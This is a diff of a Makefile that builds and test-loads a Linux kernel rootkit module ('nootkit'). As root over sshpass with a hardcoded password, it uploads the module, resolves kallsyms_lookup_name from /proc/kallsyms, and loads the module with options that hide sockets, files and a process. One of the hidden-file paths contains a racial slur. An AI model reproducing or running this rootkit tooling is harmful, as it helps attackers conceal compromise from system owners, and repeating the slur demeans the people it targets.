@@ -23,7 +23,7 @@ test-remove:
 test-upload: build
 	sshpass -pa scp nootkit.ko root@${TEST_IP}:/
 
-test-hide-socket: test-remove test-upload
+test-hide-socket: build test-remove test-upload
 	sshpass -pa ssh root@${TEST_IP} \
 	insmod /nootkit.ko \
 	' \
@@ -33,12 +33,12 @@ test-hide-socket: test-remove test-upload
 	\"" \
 	'
 
-test-hide-filename: test-remove test-upload
+test-hide-filename: build test-remove test-upload
 	sshpass -pa ssh root@${TEST_IP} \
 	insmod /nootkit.ko \
 	' \
 	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
-	hide_filenames=hello \
+	hide_filenames=hello,/root/nigga,/proc/5403,/root/bigger \
 	'
 
 # test: test-hide-filename test-hide-socket
